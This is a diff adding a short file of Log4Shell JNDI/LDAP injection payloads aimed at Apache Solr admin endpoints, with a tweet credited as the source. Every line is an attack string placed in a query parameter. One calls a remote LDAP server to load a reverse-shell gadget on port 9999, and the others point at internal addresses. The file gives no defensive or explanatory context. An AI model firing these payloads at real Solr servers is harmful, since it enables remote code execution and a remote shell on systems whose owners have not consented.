@@ -1,0 +1,7 @@
+# Source: https://twitter.com/sirifu4k1/status/1470011568834424837
+
+/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json
+
+'http://localhost:8983/solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&wt=json' 
+
+solr/admin/info/system?_=${jndi:ldap://192.168.1.1/exp}&wt=json
